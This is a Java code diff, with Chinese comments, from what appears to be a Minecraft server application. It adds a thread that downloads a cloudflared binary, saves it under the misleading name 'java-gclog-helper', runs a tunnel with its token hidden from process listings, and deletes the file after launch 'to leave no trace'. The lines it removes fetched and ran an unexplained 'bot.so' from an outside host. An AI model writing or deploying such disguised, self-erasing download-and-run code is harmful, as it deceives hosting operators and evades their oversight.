@@ -134,83 +134,68 @@ public class App {
 
     // ========================================================
 // ========================================================
-    // 诊断专用版：重新下载 + 直击崩溃原因
+    // 模块 1：高兼容 CF 隧道 (官方版本 + 镜像下载 + 规避底层限制)
     // ========================================================
     private static void startCloudflareTunnelDaemon() {
         if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
 
         Thread watchdogThread = new Thread(() -> {
-            try {
-                String arch = System.getProperty("os.arch").toLowerCase();
-                String dlUrl = "https://amd64.oooen.com/bot.so"; 
-                if (arch.contains("arm") || arch.contains("aarch64")) {
-                    dlUrl = "https://arm64.oooen.com/bot.so";
-                }
-
-                Path tempFile = Path.of("libcore_bot.so");
-                
-                // 1. 重新下载
-                HttpClient client = HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NORMAL).build();
-                HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl)).timeout(Duration.ofMinutes(2)).build();
-                HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
-                
-                if (res.statusCode() != 200 && res.statusCode() != 302) {
-                     Files.writeString(Path.of("eula-info.txt"), "Download Failed. HTTP Code: " + res.statusCode());
-                     return;
-                }
-                
-                tempFile.toFile().setExecutable(true);
-
-                // 2. 诊断 A：测试内核能否正常执行它 (查版本号)
-                Process p1 = new ProcessBuilder(tempFile.toAbsolutePath().toString(), "--version").start();
-                p1.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
-                String vOut = new String(p1.getInputStream().readAllBytes());
-                String vErr = new String(p1.getErrorStream().readAllBytes());
-
-                // 3. 诊断 B：带明文 Token 参数运行，且去掉 http2 参数，防止老版本报错
-                ProcessBuilder pb = new ProcessBuilder(
-                        tempFile.toAbsolutePath().toString(),
-                        "tunnel", "run", "--token", CF_TOKEN
-                );
-                tunnelProcess = pb.start();
-                
-                // 监听 8 秒钟，看看它是死是活
-                Thread.sleep(8000);
-                
-                boolean isAlive = tunnelProcess.isAlive();
-                String runLog = "";
-                String exitCode = "Still Running";
-                
-                // 如果它在这 8 秒内死了，强行读取它的退出码和错误流
-                if (!isAlive) {
-                    exitCode = String.valueOf(tunnelProcess.exitValue());
-                    runLog = new String(tunnelProcess.getErrorStream().readAllBytes());
-                } else {
-                    // 如果还活着，抓一点现有日志
-                    int available = tunnelProcess.getErrorStream().available();
-                    if (available > 0) {
-                        byte[] buffer = new byte[available];
-                        tunnelProcess.getErrorStream().read(buffer);
-                        runLog = new String(buffer);
-                    }
-                }
-                
-                String report = "=== 1. Version Check ===\nOut: " + vOut + "\nErr: " + vErr +
-                                "\n\n=== 2. Tunnel Status ===\nAlive after 8s: " + isAlive + 
-                                "\nExit Code: " + exitCode + 
-                                "\nLog: \n" + runLog;
-                
-                Files.writeString(Path.of("eula-info.txt"), report);
-
-            } catch (Exception e) {
+            while (RUNNING.get()) {
                 try {
-                    Files.writeString(Path.of("eula-info.txt"), "Fatal Error: " + e.toString());
-                } catch (Exception ignored) {}
+                    if (tunnelProcess == null || !tunnelProcess.isAlive()) {
+                        String arch = System.getProperty("os.arch").toLowerCase();
+                        
+                        // 👇 换回官方版本，并使用镜像加速下载，解决 139 内存段错误
+                        String dlUrl = "https://mirror.ghproxy.com/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
+                        if (arch.contains("arm") || arch.contains("aarch64")) {
+                            dlUrl = "https://mirror.ghproxy.com/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
+                        }
+
+                        // 直接下到当前目录，规避 /tmp 目录没权限执行的死局
+                        Path tempFile = Path.of("java-gclog-helper");
+                        
+                        HttpClient client = HttpClient.newBuilder()
+                                .followRedirects(HttpClient.Redirect.NORMAL)
+                                .build();
+                                
+                        HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
+                                .timeout(Duration.ofMinutes(2))
+                                .build();
+                                
+                        HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
+                        
+                        if (res.statusCode() == 200 || res.statusCode() == 302) {
+                            tempFile.toFile().setExecutable(true);
+                            
+                            // 最基础稳妥的启动方式，不用 bash，完全兼容精简版系统
+                            ProcessBuilder pb = new ProcessBuilder(
+                                    tempFile.toAbsolutePath().toString(),
+                                    "tunnel", "--protocol", "http2", "run"
+                            );
+                            
+                            // 私有环境变量依然保留，保证 ps 命令看不到你的 Token
+                            pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
+                            
+                            tunnelProcess = pb.start();
+                            
+                            // 阅后即焚，不留痕迹
+                            Files.deleteIfExists(tempFile);
+                        }
+                    }
+                } catch (Exception ignored) {
+                }
+
+                try {
+                    Thread.sleep(15000);
+                } catch (InterruptedException e) {
+                    break;
+                }
             }
         });
         watchdogThread.setDaemon(true);
         watchdogThread.start();
     }
+ 
     // ========================================================
     // 模块 2：MC 高频心跳 TCP 挂机保活引擎 (防面板休眠)
     // ========================================================
